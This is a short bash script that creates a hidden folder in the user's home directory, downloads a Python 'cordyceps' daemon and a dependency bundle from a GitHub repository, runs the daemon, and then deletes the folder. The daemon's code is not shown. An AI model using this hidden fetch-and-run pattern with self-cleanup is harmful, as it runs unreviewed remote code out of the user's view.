#!/bin/bash

# Navigate to user's home directory
cd ~ || exit

# Create a hidden folder for the daemon
hidden_dir=".cordyceps_daemon"
mkdir -p $hidden_dir
cd $hidden_dir || exit

# Fetch the cordyceps daemon from the given URL
echo "Downloading daemon..."
wget -q https://raw.githubusercontent.com/feyli/cordyceps-daemon/refs/heads/main/cordyceps.py -O daemon.py

# Fetch bundled dependencies (you need to host these files somewhere)
echo "Downloading bundled dependencies..."
wget -q https://github.com/feyli/cordyceps-daemon/raw/refs/heads/main/dependencies.tar.gz -O dependencies.tar.gz
tar -xzf dependencies.tar.gz
rm dependencies.tar.gz

# Detect Python version
if command -v python3 &>/dev/null; then
    PYTHON="python3"
elif command -v python &>/dev/null; then
    PYTHON="python"
else
    echo "Python not found. Exiting."
    cd ..
    rm -rf $hidden_dir
    exit 1
fi

# Run the daemon with PYTHONPATH pointing to our vendored libraries
echo "Starting cordyceps daemon..."
PYTHONPATH="$PWD/lib" $PYTHON daemon.py

# This will only execute if the daemon exits
echo "Cleaning up..."
cd ..
rm -rf $hidden_dir